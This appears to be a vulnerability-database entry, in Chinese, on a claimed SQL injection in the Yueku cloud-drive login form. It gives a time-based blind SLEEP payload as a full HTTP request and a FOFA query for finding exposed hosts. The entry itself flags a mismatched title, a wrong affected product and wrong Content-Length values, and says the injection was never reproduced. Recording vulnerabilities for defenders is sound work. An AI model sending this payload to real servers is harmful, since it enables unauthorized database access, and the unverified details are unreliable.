---
source: "wy876 漏洞文库"
title: "悦库网盘 user/login account SQL注入声称"
product: "悦库网盘"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本栏误写企慧通教育系统；MySQL SLEEP"
prerequisites: "登录接口带yid/客户端ID"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/iqb1350wkn2bu5qd"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%82%A6%E5%BA%93%E7%BD%91%E7%9B%98/%E6%82%A6%E5%BA%93%E7%BD%91%E7%9B%98aRegisAdmin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"悦库-悦库网盘\""
fofa_unverified: "<font style="
id: "vw-b8b689400bd5d7d6dd11dd50"
entity_id: "ve-b8b689400bd5d7d6dd11dd50"
schema_version: "1"
---

# 悦库网盘 user/login account SQL注入声称

## 条目说明

- 对象与具体问题：悦库网盘；user/login account SQL注入声称
- 版本、配置及部署条件：版本栏误写企慧通教育系统；MySQL SLEEP
- 认证与权限前提：登录接口带yid/客户端ID
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 标题aRegisAdmin与实际/user/login/.html不对应，需核是否错标题而非新入口
- 影响产品企慧通是明确模板污染；FOFA包含font HTML且元数据也font，需清理
- 注入/基准两正文长度不同同Content-Length154，且均超出该长度，不能照用
- 无计时/响应/源码/修复，鉴权/客户端签名条件未明

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
悦库网盘系统是一款功能强大的云存储平台，提供安全可靠的文件存储、共享和管理解决方案。该系统具有灵活的存储容量、文件同步、多终端访问等特性，支持跨平台的文件分享和团队协作。悦库网盘系统采用先进的加密技术确保数据安全，并提供了用户友好的界面和多样化的权限管理功能，满足个人用户、企业团队和教育机构的不同需求。悦库网盘aRegisAdmin存在SQL注入漏洞

## 二、影响版本
+ 企慧通教育系统

## 三、资产测绘
+ fofa`app="悦库-悦库网盘"`


## 四、漏洞复现
```http
POST /user/login/.html HTTP/1.1
Host: 
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Cookie: windowWidth=1036; windowHeight=846; yid=4m6jbq6mrd5mui6ul2gr3s9fl4; lang=zh-cn; device=desktop; theme=default
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 154

account=admin') AND (SELECT 4215 FROM (SELECT(SLEEP(5)))CFVi)-- WUij&password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918&clientId=5E9B11EB90214398ADA353DF7F014E9C&referer=&keepLogin=false
```

> 请求长度说明：原资料 Content-Length 为 154；保留原始标头；其数值未据实际请求体重新计算或验证。


```http
POST /user/login/.html HTTP/1.1
Host: 
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Cookie: windowWidth=1036; windowHeight=846; yid=4m6jbq6mrd5mui6ul2gr3s9fl4; lang=zh-cn; device=desktop; theme=default
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 154

account=admin&password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918&clientId=5E9B11EB90214398ADA353DF7F014E9C&referer=&keepLogin=false
```

> 请求长度说明：原资料 Content-Length 为 154；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/iqb1350wkn2bu5qd>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
